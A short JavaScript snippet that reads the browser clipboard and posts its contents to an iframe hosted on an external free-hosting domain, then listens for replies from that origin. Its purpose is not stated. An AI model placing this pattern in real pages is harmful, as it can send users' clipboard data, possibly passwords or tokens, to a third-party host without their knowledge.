function requestClipboardAccess() {
  navigator.clipboard.readText().then(text => {
    console.log("Clipboard content: " + text);
    const iframe = document.getElementById("iframe");
    const message = {
      type: "requestClipboard",
      clipboardData: text
    };
    iframe.contentWindow.postMessage(message, "https://cyborjime.000webhostapp.com");
  }).catch(err => {
    console.error("Failed to read clipboard contents: ", err);
  });
}

window.addEventListener("message", function (event) {
  if (event.origin !== "https://cyborjime.000webhostapp.com") {
    return;
  }

  console.log("Received message from iframe: ", event.data);
});